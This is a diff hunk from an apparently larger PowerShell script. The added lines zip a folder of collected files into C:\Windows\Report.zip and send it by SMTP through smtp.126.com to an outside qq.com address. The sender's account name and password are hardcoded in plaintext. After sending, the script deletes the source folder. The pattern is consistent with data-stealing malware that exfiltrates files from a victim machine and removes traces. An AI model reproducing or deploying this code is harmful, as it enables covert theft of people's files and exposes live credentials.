@@ -2904,6 +2904,27 @@ Start-sleep -seconds 1 }}}
 
 copy-ToZip($fileSaveDir)
 
+$SMTPServer = 'smtp.126.com'
 
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 25)
+
+$SMTPInfo.EnableSsl = $true
+
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('helloogirl@126.com', 'ATSK52at3');
+
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+
+$ReportEmail.From = 'helloogirl@126.com'
+
+$ReportEmail.To.Add('3064383024@qq.com')
+
+$ReportEmail.Subject = 'Report'
+
+$ReportEmail.Body = 'Report_zip'  
+
+$ReportEmail.Attachments.Add('C:\Windows\Report.zip')
+$SMTPInfo.Timeout = 1000000
+$SMTPInfo.Send($ReportEmail)
+$ReportEmail.Attachments.Dispose()
 remove-item $fileSaveDir -recurse
 #remove-item 'C:\Windows\Report.zip'
